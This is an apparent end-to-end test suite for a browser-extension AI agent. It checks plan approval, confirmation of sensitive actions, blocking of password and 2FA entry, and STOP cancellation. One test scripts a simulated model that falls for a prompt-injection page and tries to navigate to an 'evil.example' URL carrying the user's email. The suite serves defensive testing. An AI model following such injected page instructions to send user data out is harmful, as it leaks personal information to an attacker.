import {
  confirmCard,
  expect,
  openTestPage,
  PAGES,
  planCard,
  readSettings,
  sendTask,
  setSettings,
  test,
  waitIdle,
} from './fixtures';

const plan = (goal: string, steps: string[]) => ({
  tool: 'propose_plan',
  args: { goal, steps, sites: ['localhost'] },
});

test('formulário em vários passos: plano, ações, confirmação do envio e registro', async ({
  page,
  panel,
  llm,
  extensionId,
}) => {
  await setSettings(panel, { agentScreenshotEachStep: true });
  await openTestPage(page, 'form.html');
  llm.script([
    { tool: 'get_page_snapshot' },
    plan('Preencher e enviar o cadastro', ['Preencher o passo 1', 'Avançar', 'Escrever e enviar']),
    { tool: 'type', args: (r) => ({ id: r.id('Nome'), text: 'Ana', reason: 'nome pedido' }) },
    { tool: 'type', args: (r) => ({ id: r.id('E-mail'), text: 'ana@x.com' }) },
    { tool: 'select_option', args: (r) => ({ id: r.id('Estado'), option: 'São Paulo' }) },
    { tool: 'click', args: (r) => ({ id: r.id('Aceito os termos') }) },
    { tool: 'click', args: (r) => ({ id: r.id('Próximo') }) },
    { tool: 'type', args: (r) => ({ id: r.id('Mensagem'), text: 'Olá' }) },
    { tool: 'click', args: (r) => ({ id: r.id('Enviar cadastro'), reason: 'enviar como pedido' }) },
    { content: 'Cadastro enviado.' },
  ]);
  await sendTask(
    panel,
    'Preencha o cadastro com meu nome Ana, e-mail ana@x.com, estado São Paulo, aceite os termos e envie com a mensagem Olá',
  );

  // Nada acontece antes de o usuário aprovar o plano.
  await expect(planCard(panel)).toBeVisible();
  await expect(page.locator('#nome')).toHaveValue('');
  await planCard(panel).getByRole('button', { name: 'Executar plano' }).click();

  // O envio (POST, "Enviar") é sensível: para e pede confirmação.
  const card = confirmCard(panel);
  await expect(card).toBeVisible({ timeout: 30_000 });
  await expect(card).toContainText('Ação sensível');
  await expect(card).toContainText('Envia um formulário');
  await expect(page.locator('#ola')).toHaveText('Olá, Ana!');
  await expect(page).toHaveURL(/form\.html$/);
  await card.getByRole('button', { name: 'Permitir' }).click();

  await expect(page.locator('#dados')).toContainText('nome: Ana');
  await expect(page.locator('#dados')).toContainText('email: ana@x.com');
  await expect(page.locator('#dados')).toContainText('estado: SP');
  await expect(page.locator('#dados')).toContainText('mensagem: Olá');
  await waitIdle(panel);
  await expect(panel.getByText('Cadastro enviado.')).toBeVisible();
  await expect(panel.getByText('✔ confirmada por você')).toBeVisible();
  // Com "screenshot a cada passo", as observações levam o screenshot anotado ao modelo.
  expect(llm.requests.some((r) => JSON.stringify(r.messages).includes('data:image/jpeg'))).toBe(
    true,
  );

  // Registro local consultável nas configurações.
  const options = await panel.context().newPage();
  await options.goto(`chrome-extension://${extensionId}/options.html#registro`);
  const log = options.locator('#registro');
  await expect(log).toContainText('plano aprovado');
  await expect(log).toContainText('confirmada por você');
  await expect(log).toContainText('Clicar em button "Enviar cadastro"');
});

test('login falso: o agente nunca digita senha nem código 2FA', async ({ page, panel, llm }) => {
  await openTestPage(page, 'login.html');
  llm.script([
    { tool: 'get_page_snapshot' },
    plan('Entrar na conta', ['Digitar usuário', 'Digitar senha', 'Digitar código']),
    { tool: 'type', args: (r) => ({ id: r.id('Usuário'), text: 'ana' }) },
    { tool: 'type', args: (r) => ({ id: r.id('Senha'), text: 'segredo123' }) },
    { tool: 'type', args: (r) => ({ id: r.id('Código de verificação'), text: '123456' }) },
    { content: 'Digite a senha e o código você mesmo, por favor.' },
  ]);
  await sendTask(panel, 'Entre na minha conta com o usuário ana e a senha segredo123');
  await planCard(panel).getByRole('button', { name: 'Executar plano' }).click();
  await waitIdle(panel);

  await expect(page.locator('input[name="usuario"]')).toHaveValue('ana');
  await expect(page.locator('input[name="senha"]')).toHaveValue('');
  await expect(page.locator('input[name="codigo"]')).toHaveValue('');
  await expect(panel.getByText('⛔ bloqueada pela política')).toHaveCount(2);
  await expect(confirmCard(panel)).toHaveCount(0);
  expect(llm.sawToolResult('nunca preenche')).toBe(true);
});

test('injeção: a página suspeita não desvia o agente sem confirmação', async ({
  page,
  panel,
  llm,
}) => {
  await openTestPage(page, 'injection.html');
  llm.script([
    { tool: 'get_page_text' },
    plan('Resumir a receita', ['Ler a página', 'Resumir']),
    // Simula um modelo que caiu na injeção: tenta ir para o site do atacante.
    { tool: 'navigate', args: { url: 'https://evil.example/coletar?email=ana@x.com' } },
    { content: 'Não vou abrir esse site. Resumo: bolo de cenoura...' },
  ]);
  await sendTask(panel, 'Resuma esta receita');

  await expect(panel.getByText(/parece instrução para o assistente/).first()).toBeVisible();
  await planCard(panel).getByRole('button', { name: 'Executar plano' }).click();

  const card = confirmCard(panel);
  await expect(card).toBeVisible();
  await expect(card).toContainText('evil.example não faz parte do seu pedido');
  await expect(card).toContainText('parece instrução para o assistente');
  await card.getByRole('button', { name: 'Recusar' }).click();

  await waitIdle(panel);
  await expect(page).toHaveURL(`${PAGES}/agent/injection.html`);
  await expect(panel.getByText('✋ recusada por você')).toBeVisible();
  expect(llm.sawToolResult('O usuário recusou esta ação')).toBe(true);
});

test('site não habilitado: a confirmação habilita; compra continua pedindo confirmação', async ({
  page,
  panel,
  llm,
}) => {
  await setSettings(panel, { agentAllowedDomains: [] });
  await openTestPage(page, 'shop.html');
  llm.script([
    { tool: 'get_page_snapshot' },
    plan('Comprar o notebook', ['Adicionar ao carrinho', 'Finalizar compra']),
    { tool: 'click', args: (r) => ({ id: r.id('Adicionar ao carrinho') }) },
    { tool: 'click', args: (r) => ({ id: r.id('Finalizar compra') }) },
    { content: 'Você recusou a compra.' },
  ]);
  await sendTask(panel, 'Compre o notebook Alfa 14');
  await expect(planCard(panel)).toContainText('Habilitar o agente em');
  await planCard(panel).getByRole('button', { name: 'Executar plano' }).click();

  const card = confirmCard(panel);
  await expect(card).toContainText('ainda não está habilitado em localhost');
  await card.getByRole('button', { name: 'Habilitar agente em localhost e permitir' }).click();
  await expect(page.locator('#cart')).toHaveText('Carrinho: 1 item(ns)');
  expect((await readSettings(panel)).agentAllowedDomains).toEqual(['localhost']);

  await expect(card).toContainText('Ação sensível');
  await expect(card).toContainText('finalizar compra');
  await card.getByRole('button', { name: 'Recusar' }).click();
  await waitIdle(panel);
  await expect(page.locator('#status')).toHaveText('');
});

test('PARAR interrompe uma espera e nenhuma ação roda depois', async ({ page, panel, llm }) => {
  await openTestPage(page, 'form.html');
  llm.script([
    { tool: 'get_page_snapshot' },
    plan('Preencher o nome', ['Esperar', 'Digitar o nome']),
    { tool: 'wait', args: { seconds: 10 } },
    { tool: 'type', args: (r) => ({ id: r.id('Nome'), text: 'Não deveria' }) },
  ]);
  await sendTask(panel, 'Espere e preencha meu nome Ana');
  await planCard(panel).getByRole('button', { name: 'Executar plano' }).click();
  await expect(panel.getByText('⏳ executando…')).toBeVisible();

  await panel.getByRole('button', { name: '■ PARAR' }).click();
  await waitIdle(panel);
  const requests = llm.requests.length;
  await expect(panel.getByText('cancelada')).toBeVisible();
  await page.waitForTimeout(1500);
  expect(llm.requests.length).toBe(requests);
  await expect(page.locator('#nome')).toHaveValue('');
});

test('PARAR durante a resposta do modelo cancela a requisição', async ({ page, panel, llm }) => {
  await openTestPage(page, 'form.html');
  llm.script([{ content: 'tarde demais', delayMs: 20_000 }]);
  await sendTask(panel, 'Preencha meu nome Ana');
  await expect(panel.getByRole('button', { name: '■ PARAR' })).toBeVisible();
  await panel.getByRole('button', { name: '■ PARAR' }).click();
  await waitIdle(panel);
  await expect(panel.getByText('tarde demais')).toHaveCount(0);
});
